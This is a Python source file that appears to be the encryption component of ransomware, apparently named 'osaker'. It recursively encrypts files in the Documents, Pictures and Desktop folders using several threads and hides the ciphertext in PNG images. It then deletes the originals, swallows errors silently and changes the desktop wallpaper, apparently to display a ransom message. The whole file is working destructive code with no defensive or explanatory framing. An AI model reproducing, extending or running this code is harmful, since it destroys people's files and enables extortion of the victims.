import os.path
import threading

from cryptography.fernet import Fernet

from steganography import *
from utils import *


def encrypt_file(file_path, key):
    try:
        compressed_file_name = file_path + '.encrypted'

        compress_file(file_path, compressed_file_name, os.path.basename(file_path))

        with open(compressed_file_name, 'rb') as file:
            data = file.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        encrypted_file_path = compressed_file_name.replace(os.path.basename(compressed_file_name),
                                                           'osaker-' + os.path.basename(compressed_file_name) + '.png')

        hide_data(encrypted_data, encrypted_file_path)

        print("File encrypted successfully!")

    except Exception as e:
        pass


def encrypt_in_dir(dir_path, key):
    for file in os.listdir(dir_path):
        file_path = os.path.join(dir_path, file)
        if os.path.isfile(file_path):
            if file.endswith(EXTENSIONS) and not file.startswith('osaker-'):
                encrypt_file(file_path, key)
                os.remove(file_path)
                os.remove(file_path.replace(os.path.basename(file_path), os.path.basename(file_path) + '.encrypted'))
        elif os.path.isdir(file_path):
            try:
                encrypt_in_dir(file_path, key)
            except Exception:
                pass


def encrypt():
    directories = [DOCUMENTS, PICTURES, DESKTOP]

    threads = []
    for directory in directories:
        thread = threading.Thread(target=encrypt_in_dir, args=(directory, KEY))
        threads.append(thread)
        thread.start()

    thread_change_wallpaper = threading.Thread(target=change_wallpaper)
    threads.append(thread_change_wallpaper)
    thread_change_wallpaper.start()

    for thread in threads:
        thread.join()
